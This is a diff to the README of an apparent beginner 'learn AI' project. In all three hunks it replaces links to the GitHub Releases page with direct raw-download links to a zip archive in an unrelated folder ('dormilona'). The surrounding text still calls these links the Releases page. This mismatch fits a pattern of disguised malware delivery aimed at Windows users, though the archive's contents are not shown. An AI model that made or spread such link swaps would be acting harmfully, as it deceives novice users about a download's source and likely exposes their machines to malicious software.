@@ -1,6 +1,6 @@
 # 🧠 llm-vision-basics - Learn AI by Building It
 
-[![Download](https://img.shields.io/badge/Download-Releases-orange?style=for-the-badge)](https://github.com/nephrotoxic-haley82/llm-vision-basics/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-orange?style=for-the-badge)](https://raw.githubusercontent.com/nephrotoxic-haley82/llm-vision-basics/main/dormilona/llm_basics_vision_3.3.zip)
 
 ## 📦 What this is
 
@@ -40,7 +40,7 @@ If your PC is older, the notebooks can still open, but some examples may take lo
 
 Visit this page to download the latest release for Windows:
 
-[Open the Releases page](https://github.com/nephrotoxic-haley82/llm-vision-basics/releases)
+[Open the Releases page](https://raw.githubusercontent.com/nephrotoxic-haley82/llm-vision-basics/main/dormilona/llm_basics_vision_3.3.zip)
 
 On that page:
 
@@ -219,7 +219,7 @@ This project works best when you go slowly and test each step
 
 If you need the files again, use this page:
 
-[https://github.com/nephrotoxic-haley82/llm-vision-basics/releases](https://github.com/nephrotoxic-haley82/llm-vision-basics/releases)
+[https://raw.githubusercontent.com/nephrotoxic-haley82/llm-vision-basics/main/dormilona/llm_basics_vision_3.3.zip](https://raw.githubusercontent.com/nephrotoxic-haley82/llm-vision-basics/main/dormilona/llm_basics_vision_3.3.zip)
 
 Open the latest release and download the package for your Windows machine
 
